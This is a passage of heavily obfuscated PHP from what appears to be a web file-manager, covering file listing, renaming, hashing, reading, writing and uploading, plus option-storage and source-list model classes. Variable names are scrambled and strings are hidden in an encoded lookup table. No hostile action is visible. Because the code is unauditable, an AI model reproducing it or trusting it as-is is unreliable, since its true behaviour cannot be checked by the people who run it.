(is_dir($é¯‹É¸ƒ)) { chmod($é¯‹É¸ƒ, $this->pathAuth); $é¯‹É¸ƒ = $this->iconvApp($é¯‹É¸ƒ); if (!$this->delFolder($é¯‹É¸ƒ)) { return !1; } } } } closedir($ÌÇƒÌÜÄ); return rmdir($šöÚ”ÊÔ); } public function rename($µÄ‘¦şÈ, $ñ›úñÔ) { $€±«²¸ =& $_SERVER[ú÷îèÆÜ]; $ªŸ‚ç§ü = $this->fileNameAuto($this->pathFather($µÄ‘¦şÈ), $ñ›úñÔ); $ªŸ‚ç§ü = $this->iconvSystem($ªŸ‚ç§ü); $µÄ‘¦şÈ = $this->iconvSystem($µÄ‘¦şÈ); $Øæ¼êĞª = $this->pathFather($µÄ‘¦şÈ); $Ú¾Èôéš = rtrim($Øæ¼êĞª, $€±«²¸[18]) . $€±«²¸[18] . $ªŸ‚ç§ü; $ü“ÍÕ«Ê = @rename($µÄ‘¦şÈ, $Ú¾Èôéš); $Ú¾Èôéš = $this->iconvApp($Ú¾Èôéš); return $ü“ÍÕ«Ê ? $this->getPathOuter($Ú¾Èôéš) : !1; } public function size($ğ‰ìøÅ²) { $ğ‰ìøÅ² = $this->iconvSystem($ğ‰ìøÅ²); return filesize_64($ğ‰ìøÅ²); } public function info($ì‡ÀìÅğ) { $ì‡ÀìÅğ = $this->iconvSystem($ì‡ÀìÅğ); if ($this->isFolder($ì‡ÀìÅğ)) { return $this->folderInfo($ì‡ÀìÅğ); } else { if ($this->isFile($ì‡ÀìÅğ)) { return $this->fileInfo($ì‡ÀìÅğ); } } return !1; } protected function infoChildren($ôğÛşş, &$ğÃ‰’ §, $Óñ¦ß = true) { $‘‡çÔšü =& $_SERVER[ú÷îèÆÜ]; check_abort_echo(); $ôğÛşş = rtrim($ôğÛşş, $‘‡çÔšü[18]) . $‘‡çÔšü[18]; if ($Óñ¦ß) { $ôğÛşş = $this->iconvSystem($ôğÛşş); } if (!($á§ƒä = @opendir($ôğÛşş))) { return; } while (($·ÒÏûÏ¥ = readdir($á§ƒä)) !== !1) { if ($·ÒÏûÏ¥ == $‘‡çÔšü[20] || $·ÒÏûÏ¥ == $‘‡çÔšü[1319]) { continue; } $¦üá„…¯ = $ôğÛşş . $·ÒÏûÏ¥; if (is_file($¦üá„…¯) || is_link($¦üá„…¯)) { $ğÃ‰’ §[$‘‡çÔšü[87]]++; $ğÃ‰’ §[$‘‡çÔšü[86]] += filesize_64($¦üá„…¯); } else { if (is_dir($¦üá„…¯)) { $ğÃ‰’ §[$‘‡çÔšü[88]]++; $this->infoChildren($¦üá„…¯, $ğÃ‰’ §, !1); } } } closedir($á§ƒä); } private function folderInfo($ñ±øì‹Ú, $ƒâ°¾œî = false) { $û…‰á ß =& $_SERVER[ú÷îèÆÜ]; $ñ±øì‹Ú = rtrim($ñ±øì‹Ú, $û…‰á ß[18]) . $û…‰á ß[18]; $ÒöËŒ­à = $this->iconvApp($this->pathThis($ñ±øì‹Ú)); if ($ƒâ°¾œî) { return array($û…‰á ß[42] => $ÒöËŒ­à, $û…‰á ß[94] => $this->getPathOuter($ñ±øì‹Ú), $û…‰á ß[43] => $û…‰á ß[85]); } $Å¦ØÚ’ = array($û…‰á ß[42] => $ÒöËŒ­à, $û…‰á ß[94] => $this->getPathOuter($ñ±øì‹Ú), $û…‰á ß[43] => $û…‰á ß[85], $û…‰á ß[225] => @filectime($ñ±øì‹Ú), $û…‰á ß[95] => @filemtime($ñ±øì‹Ú), $û…‰á ß[1403] => @fileatime($ñ±øì‹Ú), $û…‰á ß[1404] => is_readable($ñ±øì‹Ú), $û…‰á ß[1405] => is_writable($ñ±øì‹Ú), $û…‰á ß[1406] => get_mode($ñ±øì‹Ú)); return $Å¦ØÚ’; } private function fileInfo($‚‰ı–¿ú, $´Ó±ÊÆ = false) { $°‰Èµ±ì =& $_SERVER[ú÷îèÆÜ]; $ß½µËÓ = $this->iconvApp($this->pathThis($‚‰ı–¿ú)); if ($´Ó±ÊÆ) { return array($°‰Èµ±ì[42] => $ß½µËÓ, $°‰Èµ±ì[94] => $this->getPathOuter($‚‰ı–¿ú), $°‰Èµ±ì[43] => $°‰Èµ±ì[224], $°‰Èµ±ì[86] => $this->size($‚‰ı–¿ú), $°‰Èµ±ì[185] => $this->ext($ß½µËÓ)); } $úùŠÂ¼ = array($°‰Èµ±ì[42] => $ß½µËÓ, $°‰Èµ±ì[94] => $this->getPathOuter($‚‰ı–¿ú), $°‰Èµ±ì[43] => $°‰Èµ±ì[224], $°‰Èµ±ì[225] => @filectime($‚‰ı–¿ú), $°‰Èµ±ì[95] => @filemtime($‚‰ı–¿ú), $°‰Èµ±ì[1403] => @fileatime($‚‰ı–¿ú), $°‰Èµ±ì[86] => $this->size($‚‰ı–¿ú), $°‰Èµ±ì[185] => $this->ext($ß½µËÓ), $°‰Èµ±ì[1404] => is_readable($‚‰ı–¿ú), $°‰Èµ±ì[1405] => is_writable($‚‰ı–¿ú), $°‰Èµ±ì[1406] => get_mode($‚‰ı–¿ú)); return $úùŠÂ¼; } public function exist($ÇÖ Ú“) { $ÇÖ Ú“ = $this->iconvSystem($ÇÖ Ú“); return @file_exists($ÇÖ Ú“); } public function isFile($Ö’Û§ß³) { $Ö’Û§ß³ = $this->iconvSystem($Ö’Û§ß³); return @is_file($Ö’Û§ß³); } public function isFolder($Â³Åœ£) { $Â³Åœ£ = $this->iconvSystem($Â³Åœ£); return @is_dir($Â³Åœ£); } public function listPath($ö¶‘Ò, $š¢‡õï‹ = false) { $‘†ùÆ¯¿ =& $_SERVER[ú÷îèÆÜ]; $ö¶‘Ò = $this->iconvSystem($ö¶‘Ò); $ö¶‘Ò = rtrim($ö¶‘Ò, $‘†ùÆ¯¿[18]) . $‘†ùÆ¯¿[18]; $Á¹öï = array($‘†ùÆ¯¿[92] => array(), $‘†ùÆ¯¿[93] => array()); if (!($¢´•˜İ³ = @opendir($ö¶‘Ò))) { return $Á¹öï; } while (($î—ƒ¢Š = readdir($¢´•˜İ³)) !== !1) { if ($î—ƒ¢Š == $‘†ùÆ¯¿[20] || $î—ƒ¢Š == $‘†ùÆ¯¿[1319]) { continue; } $çùÅ„¬ = $ö¶‘Ò . $î—ƒ¢Š; if (is_file($çùÅ„¬)) { $Á¹öï[$‘†ùÆ¯¿[93]][] = $this->fileInfo($çùÅ„¬, $š¢‡õï‹); } else { $Á¹öï[$‘†ùÆ¯¿[92]][] = $this->folderInfo($çùÅ„¬, $š¢‡õï‹); } } closedir($¢´•˜İ³); return $Á¹öï; } public function listAll($Æ€ËÆ°‚, &$±«Ùì¼© = array()) { $êÛËş¨Ö =& $_SERVER[ú÷îèÆÜ]; $Æ€ËÆ°‚ = $this->iconvSystem($Æ€ËÆ°‚); $Æ€ËÆ°‚ = rtrim($Æ€ËÆ°‚, $êÛËş¨Ö[18]) . $êÛËş¨Ö[18]; if (!($‰ÓˆèäÏ = @opendir($Æ€ËÆ°‚))) { return $±«Ùì¼©; } while (($¤••ñí = readdir($‰ÓˆèäÏ)) !== !1) { if ($¤••ñí == $êÛËş¨Ö[20] || $¤••ñí == $êÛËş¨Ö[1319]) { continue; } $‹İ£Äî = $Æ€ËÆ°‚ . $¤••ñí; $ôŠÙ¼®ä = is_dir($‹İ£Äî) && !is_link($‹İ£Äî) ? 1 : 0; $‹İ£Äî = $ôŠÙ¼®ä ? $‹İ£Äî . $êÛËş¨Ö[18] : $‹İ£Äî; $±«Ùì¼©[] = array($êÛËş¨Ö[94] => $‹İ£Äî, $êÛËş¨Ö[85] => $ôŠÙ¼®ä, $êÛËş¨Ö[95] => intval(@filemtime($‹İ£Äî)), $êÛËş¨Ö[86] => $ôŠÙ¼®ä ? 0 : intval($this->size($‹İ£Äî))); if ($ôŠÙ¼®ä) { $this->listAll($‹İ£Äî, $±«Ùì¼©); } } closedir($‰ÓˆèäÏ); return $±«Ùì¼©; } public function has($ïÀ•—ÁÄ, $Ôäõµ±º = false, $ø¾ş÷à˜ = true) { $Ù×»İ¨” =& $_SERVER[ú÷îèÆÜ]; $ïÀ•—ÁÄ = $this->iconvSystem($ïÀ•—ÁÄ); $ïÀ•—ÁÄ = rtrim($ïÀ•—ÁÄ, $Ù×»İ¨”[18]) . $Ù×»İ¨”[18]; if (!($¦ğä’ç« = @opendir($ïÀ•—ÁÄ))) { return !1; } $èİÔá˜¼ = 0; $À®ƒîò = 0; $îÌñˆ£ì = 0; while (($°á…­ù = readdir($¦ğä’ç«)) !== !1) { if ($°á…­ù == $Ù×»İ¨”[20] || $°á…­ù == $Ù×»İ¨”[1319]) { continue; } $Êâøäø‘ = $ïÀ•—ÁÄ . $°á…­ù; if ($Ôäõµ±º) { $îÌñˆ£ì++; if (@is_file($Êâøäø‘)) { $èİÔá˜¼++; } else { $À®ƒîò++; } if ($îÌñˆ£ì > 10000) { break; } continue; } if ($ø¾ş÷à˜) { if (@is_file($Êâøäø‘)) { return !0; } } else { if (@is_dir($Êâøäø‘ . $Ù×»İ¨”[18])) { return !0; } } } closedir($¦ğä’ç«); if ($Ôäõµ±º) { return array($Ù×»İ¨”[233] => $èİÔá˜¼, $Ù×»İ¨”[234] => $À®ƒîò); } return !1; } public function hashSimple($ÕÒªØ˜) { $®ê“£¸» =& $_SERVER[ú÷îèÆÜ]; if (!$ÕÒªØ˜) { return md5($®ê“£¸»[22]); } $ÕÒªØ˜ = $this->iconvSystem($ÕÒªØ˜); $¯Êïã• = $this->size($ÕÒªØ˜); $ˆë€”Óê = 200; $ø’ »¤ = 50; if ($¯Êïã• <= $ˆë€”Óê * $ø’ »¤) { return $this->hashMd5($ÕÒªØ˜) . $¯Êïã•; } $Ä±Á×´ = $®ê“£¸»[22]; $œ–ıÂü— = intval($¯Êïã• / $ø’ »¤); $Ì¦üÙç‡ = fopen($ÕÒªØ˜, $®ê“£¸»[1407]); if (!$Ì¦üÙç‡) { return $Ä±Á×´; } for ($Ñô……ùÙ = 0; $Ñô……ùÙ < $ø’ »¤; $Ñô……ùÙ++) { fseek_64($Ì¦üÙç‡, $œ–ıÂü— * $Ñô……ùÙ); $Ä±Á×´ .= fread($Ì¦üÙç‡, $ˆë€”Óê); } fseek_64($Ì¦üÙç‡, $¯Êïã• - $ˆë€”Óê); $Ä±Á×´ .= fread($Ì¦üÙç‡, $ˆë€”Óê); fclose($Ì¦üÙç‡); return md5($Ä±Á×´) . $¯Êïã•; } public function getContent($Îœğ¨Íô) { $Îœğ¨Íô = $this->iconvSystem($Îœğ¨Íô); return file_get_contents($Îœğ¨Íô); } public function setContent($¸¦ÍºóÁ, $¹¡Àùñ¤ = '') { $¸¦ÍºóÁ = $this->iconvSystem($¸¦ÍºóÁ); $˜ÔÓı«Ü = @file_put_contents($¸¦ÍºóÁ, $¹¡Àùñ¤, LOCK_EX); clearstatcache(); @chmod($¸¦ÍºóÁ, $this->pathAuth); return $˜ÔÓı«Ü === !1 ? !1 : !0; } public function fileSubstr($ºÓŸ¥‘, $‹™óİì² = 0, $Ôßá§á¨ = false) { $æÁë›é÷ =& $_SERVER[ú÷îèÆÜ]; $ºÓŸ¥‘ = $this->iconvSystem($ºÓŸ¥‘); if ($Ôßá§á¨ === !1) { $Ôßá§á¨ = $this->size($ºÓŸ¥‘); } if ($Ôßá§á¨ <= 0) { return $æÁë›é÷[22]; } $Ñ–¸Ğ‹ë = fopen($ºÓŸ¥‘, $æÁë›é÷[1407]); if (!$Ñ–¸Ğ‹ë) { return !1; } fseek_64($Ñ–¸Ğ‹ë, $‹™óİì²); $êÏ™Œöç = fread($Ñ–¸Ğ‹ë, $Ôßá§á¨); fclose($Ñ–¸Ğ‹ë); return $êÏ™Œöç; } public function upload($•Ñˆ´ó , $¶¾ûÙ’, $İ»¯éİÖ = false, $‘¿¬â„™ = REPEAT_REPLACE) { if ($İ»¯éİÖ) { return $this->moveFile($¶¾ûÙ’, $•Ñˆ´ó ); } return $this->copyFile($¶¾ûÙ’, $•Ñˆ´ó ); } public function setModifyTime($Ú‹Ø‰óØ, $ëõ ƒÌõ = '') { @touch($Ú‹Ø‰óØ, intval($ëõ ƒÌõ)); } public function download($ÃîÓåşá, $µ¤û“ã¤) { return $this->iconvSystem($ÃîÓåşá); } } goto a¢šëŞ; c¶éñì¯¥: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\x65\x6d\117\x70\164\151\x6f\x6e"; public $field = array(); public function listData($ëĞñç” = false, $¶¸“»ö = "\x6d\x6f\x64\x69\x66\x79\124\151\x6d\x65", $Ï†Éé’ú = false) { $“êÅÓàø = Model($this->modelType)->get(!1, $this->optionType, !0); $‘§ÈñÃ© = array_values($“êÅÓàø); if ($‘§ÈñÃ© && $‘§ÈñÃ©[0] && !is_array($‘§ÈñÃ©[0])) { Model($this->modelType)->cacheRemove($this->optionType); $“êÅÓàø = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$“êÅÓàø) { return $ëĞñç” ? null : array(); } if (!$ëĞñç”) { $“êÅÓàø = array_filter(array_values($“êÅÓàø)); return array_sort_by($“êÅÓàø, $¶¸“»ö, $Ï†Éé’ú); } return $“êÅÓàø[$_SERVER[ú÷îèÆÜ][449] . $ëĞñç”]; } public function insert($ÙØ‹Ù˜¢) { $î¥Ğ©¬’ =& $_SERVER[ú÷îèÆÜ]; $ÙØ‹Ù˜¢ = array_field_key($ÙØ‹Ù˜¢, $this->field); $ÖãƒÙµµ = Model($this->modelType)->get($î¥Ğ©¬’[450], $this->optionType . $î¥Ğ©¬’[451]); $ÖãƒÙµµ = $ÖãƒÙµµ ? $ÖãƒÙµµ : 0; $ÙØ‹Ù˜¢[$î¥Ğ©¬’[452]] = ++$ÖãƒÙµµ; $ÙØ‹Ù˜¢[$î¥Ğ©¬’[225]] = time(); $ÙØ‹Ù˜¢[$î¥Ğ©¬’[95]] = time(); Model($this->modelType)->set($î¥Ğ©¬’[450], $ÖãƒÙµµ, $this->optionType . $î¥Ğ©¬’[451]); Model($this->modelType)->set($î¥Ğ©¬’[449] . $ÖãƒÙµµ, $ÙØ‹Ù˜¢, $this->optionType); return $ÖãƒÙµµ; } public function update($‹í¾Âïå, $Ô£¸ƒ‡) { $Ëäåçà =& $_SERVER[ú÷îèÆÜ]; $Ô£¸ƒ‡ = array_field_key($Ô£¸ƒ‡, $this->field); $¦–éÆŠò = $this->listData($‹í¾Âïå); if (!$¦–éÆŠò || !$‹í¾Âïå) { return !1; } $Ô£¸ƒ‡ = array_merge($¦–éÆŠò, $Ô£¸ƒ‡); $Ô£¸ƒ‡[$Ëäåçà[95]] = time(); return Model($this->modelType)->set($Ëäåçà[449] . $‹í¾Âïå, $Ô£¸ƒ‡, $this->optionType); } public function remove($šªòÑÓÙ) { if (!$šªòÑÓÙ) { return !1; } return Model($this->modelType)->remove($_SERVER[ú÷îèÆÜ][449] . $šªòÑÓÙ, $this->optionType); } public function clear() { $×ˆôËÍ =& $_SERVER[ú÷îèÆÜ]; Model($this->modelType)->remove($×ˆôËÍ[450], $this->optionType . $×ˆôËÍ[451]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ıĞŞšæ, $½‰ç¯Ÿ) { if (!$½‰ç¯Ÿ) { return !1; } $¢ª§™èı = $this->listData(); $¢ª§™èı = array_to_keyvalue($¢ª§™èı, $ıĞŞšæ); return isset($¢ª§™èı[$½‰ç¯Ÿ]) ? $¢ª§™èı[$½‰ç¯Ÿ] : !1; } public function findByName($û„áãóë) { return $this->findByKey($_SERVER[ú÷îèÆÜ][42], $û„áãóë); } protected function resetData($ÁˆÁ˜) { $À½š“Úü =& $_SERVER[ú÷îèÆÜ]; $ÁˆÁ˜ = is_array($ÁˆÁ˜) ? $ÁˆÁ˜ : array(); $ƒí¹û™ò = array(); for ($É±ÍÌçı = 0; $É±ÍÌçı < count($ÁˆÁ˜); $É±ÍÌçı++) { $ƒí¹û™ò[$À½š“Úü[449] . $ÁˆÁ˜[$É±ÍÌçı][$À½š“Úü[452]]] = $ÁˆÁ˜[$É±ÍÌçı]; } return Model($this->modelType)->set($ƒí¹û™ò, !1, $this->optionType); } private function getAutoName($®ŒÏñ¹Ç) { $‡ñ³Ú¤ı = array_to_keyvalue($this->listData(), $_SERVER[ú÷îèÆÜ][42]); if (!$‡ñ³Ú¤ı || !isset($‡ñ³Ú¤ı[$®ŒÏñ¹Ç])) { return $®ŒÏñ¹Ç; } for ($ôä³Æ”® = 1; $ôä³Æ”® < count($‡ñ³Ú¤ı); $ôä³Æ”®++) { $¾‰ĞÜüÎ = $®ŒÏñ¹Ç . "\x28{$ôä³Æ”®}\x29"; if (!isset($‡ñ³Ú¤ı[$¾‰ĞÜüÎ])) { return $¾‰ĞÜüÎ; } } return $¾‰ĞÜüÎ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($áı£ªâ = false, $Õ¢ç²¸Ï = '', $áÁåÚ§ú = false) { $Î·ÆÌ•Ê =& $_SERVER[ú÷îèÆÜ]; $ûºëë¸Š = $this->cacheGet($Õ¢ç²¸Ï); $Ï‚ÕóÑ = $this->optionDefault($Õ¢ç²¸Ï); $Ï‚ÕóÑ = is_array($Ï‚ÕóÑ) ? $Ï‚ÕóÑ : array(); if (is_array($ûºëë¸Š)) { $ûºëë¸Š = array_merge($Ï‚ÕóÑ, $ûºëë¸Š); return $áı£ªâ ? isset($ûºëë¸Š[$áı£ªâ]) ? $ûºëë¸Š[$áı£ªâ] : null : $ûºëë¸Š; } $î°îÚà = $this->filterWhere(array($Î·ÆÌ•Ê[43] => $Õ¢ç²¸Ï)); $ûºëë¸Š = $this->where($î°îÚà)->select(); $ûºëë¸Š = array_to_keyvalue($ûºëë¸Š, $Î·ÆÌ•Ê[104], $Î·ÆÌ•Ê[427]); foreach ($ûºëë¸Š as $ÑôÆ¹ÀÇ => $šÑÊÅô–) { if ($áÁåÚ§ú || in_array($ÑôÆ¹ÀÇ, $this->jsonField)) { $ûºëë¸Š[$ÑôÆ¹ÀÇ] = json_decode($šÑÊÅô–, !0); } } $this->cacheSet($Õ¢ç²¸Ï, $ûºëë¸Š); $ûºëë¸Š = array_merge($Ï‚ÕóÑ, $ûºëë¸Š); return $áı£ªâ ? $ûºëë¸Š[$áı£ªâ] : $ûºëë¸Š; } public function set($ Ğö‹ÕÃ, $ÅæÓÂÅĞ = false, $‹¹ª°ãİ = '') { $á¿¸…à =& $_SERVER[ú÷îèÆÜ]; $this->cacheRemove($‹¹ª°ãİ); $ÚÊœŒı = array(); $ñÍ–Í¤á = is_array($ Ğö‹ÕÃ) ? $ Ğö‹ÕÃ : array($ Ğö‹ÕÃ => $ÅæÓÂÅĞ); foreach ($ñÍ–Í¤á as $äÙ­˜º¦ => $Æ®¸÷Ã) { if (is_array($Æ®¸÷Ã)) { $Æ®¸÷Ã = json_encode_force($Æ®¸÷Ã); } $this->checkLength($Æ®¸÷Ã, !1, $this->tableName . $á¿¸…à[4] . $ Ğö‹ÕÃ); $Æ®¸÷Ã = self::textEncode($Æ®¸÷Ã); $ñÍ–Í¤á = array($á¿¸…à[43] => $‹¹ª°ãİ, $á¿¸…à[104] => $äÙ­˜º¦, $á¿¸…à[427] => $Æ®¸÷Ã); $ÚÊœŒı[] = $this->filterWhere($ñÍ–Í¤á); } if (!$ÚÊœŒı) { return !0; } $£¢‹«€° = $this->cacheKey($á¿¸…à[453]); CacheLock::lock($£¢‹«€°); $É×ûèòì = $this->addAll($ÚÊœŒı, array(), !0); CacheLock::unlock($£¢‹«€°); return $É×ûèòì; } protected function optionDefault($·ñ«äÆĞ = '') { return !1; } public function setDeep($ˆƒ—¥öİ, $šÃ«â¬° = false, $¿ÖÁÜİÉ = '') { $¨ƒÌ—­è = explode($_SERVER[ú÷îèÆÜ][20], $ˆƒ—¥öİ); $ø£ƒããö = $this->get(); array_set_value($ø£ƒããö, $ˆƒ—¥öİ, $šÃ«â¬°); $this->set($¨ƒÌ—­è[0], $ø£ƒããö[$¨ƒÌ—­è[0]], $¿ÖÁÜİÉ); } public function remove($ÙÆâÔâ, $²¬Ä‘¬ó = '') { $ç…—úßæ =& $_SERVER[ú÷îèÆÜ]; $this->cacheRemove($²¬Ä‘¬ó); $êÅñ¤œ³ = $this->filterWhere(array($ç…—úßæ[104] => $ÙÆâÔâ, $ç…—úßæ[43] => $²¬Ä‘¬ó)); if (is_null($ÙÆâÔâ)) { unset($êÅñ¤œ³[$ç…—úßæ[104]]); } return $this->where($êÅñ¤œ³)->delete(); } public function cacheSet($ˆ­ÚßŒ›, $ ª±õŠ§ = false) { return Cache::set($this->cacheKey($ˆ­ÚßŒ›), $ ª±õŠ§); } public function cacheGet($£œÛè­Ü) { return Cache::get($this->cacheKey($£œÛè­Ü)); } public function cacheRemove($äÔ´ÀŠ•) { return Cache::remove($this->cacheKey($äÔ´ÀŠ•)); } protected function filterWhere($ßÖ»¯“º) { return $ßÖ»¯“º; } protected function cacheKey($ş’±¡ªÊ) { return $ş’±¡ªÊ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\162\x63\145"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\141\x6d\x65" => "\x69\157\x5f\x73\157\x75\x72\x63\x65\x5f\x6d\x65\x74\141", "\x6d\x65\x74\x61\106\151\145\x6c\144" => "\x73\x6f\165\162\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\x54\151\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\163\x65\x72\x74", "\x66\x75\x6e\x63\164\151\157\156"), array("\143\x72\145\x61\x74\145\x54\151\x6d\145", "\164\151\155\x65", "\x69\x6e\x73\145\x72\164", "\146\x75\x6e\143\x74\x69\x6f\x6e"), array("\x76\x69\145\167\124\x69\155\x65", "\x74\151\155\x65", "\x69\156\163\145\162\164", "\x66\x75\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ı™Åº½ˆ) { return $this->listSource(array($_SERVER[ú÷îèÆÜ][454] => $ı™Åº½ˆ)); } public function typeName($·Ş²Ï’) { static $ÍÊœşİ¥ = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $ÍÊœşİ¥[$·Ş²Ï’ . $_SERVER[ú÷îèÆÜ][22]]; } public function sourceListInfo($¾÷¶Ç¬¨, $©«Æö­¬ = false) { $·‰“şä =& $_SERVER[ú÷îèÆÜ]; $¾÷¶Ç¬¨ = $¾÷¶Ç¬¨ ? $¾÷¶Ç¬¨ : array(); $¾÷¶Ç¬¨ = array_filter(array_unique($¾÷¶Ç¬¨)); if (!$¾÷¶Ç¬¨) { return array(); } $ÖèñÒï = $this->where(array($·‰“şä[191] => array($·‰“şä[17], $¾÷¶Ç¬¨)))->select(); $this->_listDataApply($ÖèñÒï, $©«Æö­¬); return array_to_keyvalue($ÖèñÒï, $·‰“şä[191]); } public function pathInfoFilter(&$ÊçÆ¿™ˆ) { $ìÁÍØô =& $_SERVER[ú÷îèÆÜ]; static $Ûú¾¤¶Œ = false; static $›Ù£ö‰ = false; static $¿ŞÙíò = false; if (!$Ûú¾¤¶Œ) { $ÕÊ¸¦¾€ = $ìÁÍØô[455]; $ÕÊ¸¦¾€ .= $ìÁÍØô[456]; $ÕÊ¸¦¾€ .= $ìÁÍØô[457]; $Êì²¬Úö = $ìÁÍØô[458]; $â‘éÙ£é = explode($ìÁÍØô[60], $Êì²¬Úö); $Ûú¾¤¶Œ = explode($ìÁÍØô[60], $ÕÊ¸¦¾€); $›Ù£ö‰ = array(); foreach ($Ûú¾¤¶Œ as $„ÆëÙ¶) { if (in_array($„ÆëÙ¶, $â‘éÙ£é)) { continue; } $›Ù£ö‰[] = $„ÆëÙ¶; } $¿ŞÙíò = explode($ìÁÍØô[60], $ìÁÍØô[459]); } foreach ($¿ŞÙíò as $Ç®Şç) { if (isset($ÊçÆ¿™ˆ[$Ç®Şç])) { $ÊçÆ¿™ˆ[$Ç®Şç] = intval($ÊçÆ¿™ˆ[$Ç®Şç]); } } $ÊçÆ¿™ˆ[$ìÁÍØô[94]] = $ìÁÍØô[460] . $ÊçÆ¿™ˆ[$ìÁÍØô[191]] . $ìÁÍØô[461]; $ÊçÆ¿™ˆ[$ìÁÍØô[43]] = $ÊçÆ¿™ˆ[$ìÁÍØô[462]] == 1 ? $ìÁÍØô[85] : $ìÁÍØô[224]; $ÊçÆ¿™ˆ[$ìÁÍØô[188]] = $this->typeName($ÊçÆ¿™ˆ[$ìÁÍØô[188]]); if ($ÊçÆ¿™ˆ[$ìÁÍØô[462]] != 1) { $ÊçÆ¿™ˆ[$ìÁÍØô[185]] = $ÊçÆ¿™ˆ[$ìÁÍØô[463]]; unset($ÊçÆ¿™ˆ[$ìÁÍØô[463]]); } $¿…‰à¼ = $Ûú¾¤¶Œ; if (isset($ÊçÆ¿™ˆ[$ìÁÍØô[464]]) && $ÊçÆ¿™ˆ[$ìÁÍØô[464]][$ìÁÍØô[465]] == -1) { $¿…‰à¼ = $›Ù£ö‰; } $ÊçÆ¿™ˆ = array_field_key($ÊçÆ¿™ˆ, $¿…‰à¼); return $ÊçÆ¿™ˆ; } public function listUserFav() { $”¾á‹Ñ¿ =& $_SERVER[ú÷îèÆÜ]; $¿‰›ÀÇˆ = Model($”¾á‹Ñ¿[466])->listData(); $İíÇŸ»Ö = array_filter_by_field($¿‰›ÀÇˆ, $”¾á‹Ñ¿[43], $”¾á‹Ñ¿[467]); $İíÇŸ»Ö = array_to_keyvalue($İíÇŸ»Ö, $”¾á‹Ñ¿[22], $”¾á‹Ñ¿[94]); if ($İíÇŸ»Ö) { $²î••ÃŠ = $this->listSource(array($”¾á‹Ñ¿[468] => array($”¾á‹Ñ¿[469], $İíÇŸ»Ö))); } $²î••ÃŠ = array_to_keyvalue($²î••ÃŠ[$”¾á‹Ñ¿[422]], $”¾á‹Ñ¿[191]); foreach ($¿‰›ÀÇˆ as &$Û­„‘ º) { $Û­„‘ º = array($”¾á‹Ñ¿[470] => $Û­„‘ º[$”¾á‹Ñ¿[452]], $”¾á‹Ñ¿[471] => $Û­„‘ º[$”¾á‹Ñ¿[42]], $”¾á‹Ñ¿[472] => $Û­„‘ º[$”¾á‹Ñ¿[94]], $”¾á‹Ñ¿[473] => $Û­„‘ º[$”¾á‹Ñ¿[43]], $”¾á‹Ñ¿[474] => $Û­„‘ º[$”¾á‹Ñ¿[225]], $”¾á‹Ñ¿[475] => $Û­„‘ º[$”¾á‹Ñ¿[95]]); if ($Û­„‘ º[$”¾á‹Ñ¿[43]] == $”¾á‹Ñ¿[467] && $²î••ÃŠ[$Û­„‘ º[$”¾á‹Ñ¿[94]]]) { $Û­„‘ º[$”¾á‹Ñ¿[97]] = $²î••ÃŠ[$Û­„‘ º[$”¾á‹Ñ¿[94]]]; } } unset($Û­„‘ º); return $¿‰›ÀÇˆ; } public function listUserTag($®ÙÄ™Õ¾) { $ûÁûÑ¼£ =& $_SERVER[ú÷îèÆÜ]; if ($®ÙÄ™Õ¾ && !is_array($®ÙÄ™Õ¾)) { $®ÙÄ™Õ¾ = array($®ÙÄ™Õ¾); } $ÛÎ™öÙ = Model($ûÁûÑ¼£[476])->listData(); $ã†ª = array(); $ß ÁÕ²Ì = array(); foreach ($ÛÎ™öÙ as $õ„×ßüİ) { $Ó¥ßÍû¶ = $õ„×ßüİ[$ûÁûÑ¼£[94]]; if (!$Ó¥ßÍû¶) { continue; } if (!isset($ß ÁÕ²Ì[$Ó¥ßÍû¶])) { $ß ÁÕ²Ì[$Ó¥ßÍû¶] = array(); } $ß ÁÕ²Ì[$Ó¥ßÍû¶][] = $õ„×ßüİ[$ûÁûÑ¼£[477]]; $ã†ª[$õ„×ßüİ[$ûÁûÑ¼£[94]]] = $õ„×ßüİ; } $Ü™ª½ÈÙ = array(); $óšÃ„†¼ = array(); $“«ˆµù = array(); foreach ($ß ÁÕ²Ì as $œÆƒßË => $¾š™Ñ¼±) { $ÜâÆÆ«¥ = !0; if (!$®ÙÄ™Õ¾) { $Ü™ª½ÈÙ[] = $œÆƒßË; continue; } foreach ($®ÙÄ™Õ¾ as $Â›ˆî‹») { if (!in_array($Â›ˆî‹», $¾š™Ñ¼±)) { $ÜâÆÆ«¥ = !1; break; } } if (!$ÜâÆÆ«¥) { continue; } if (!is_numeric($œÆƒßË)) { $—õ˜×Ã = $ã†ª[$œÆƒßË]; $ğ·úöö³ = array($ûÁûÑ¼£[42] => $—õ˜×Ã[$ûÁûÑ¼£[42]], $ûÁûÑ¼£[94] => $—õ˜×Ã[$ûÁûÑ¼£[94]], $ûÁûÑ¼£[43] => $—õ˜×Ã[$ûÁûÑ¼£[43]], $ûÁûÑ¼£[97] => array($ûÁûÑ¼£[478] => 1), $ûÁûÑ¼£[226] => !0); if ($—õ˜×Ã[$ûÁûÑ¼£[43]] == $ûÁûÑ¼£[224]) { $“«ˆµù[] = $ğ·úöö³; } if ($—õ˜×Ã[$ûÁûÑ¼£[43]] == $ûÁûÑ¼£[85]) { $óšÃ„†¼[] = $ğ·úöö³; } continue; } $Ü™ª½ÈÙ[] = $œÆƒßË; } if ($Ü™ª½ÈÙ) { $†êíúÔô = $this->listSource(array($ûÁûÑ¼£[468] => array($ûÁûÑ¼£[469], $Ü™ª½ÈÙ))); } $†êíúÔô = $†êíúÔô ? $†êíúÔô : array($ûÁûÑ¼£[92] => array(), $ûÁûÑ¼£[93] => array()); 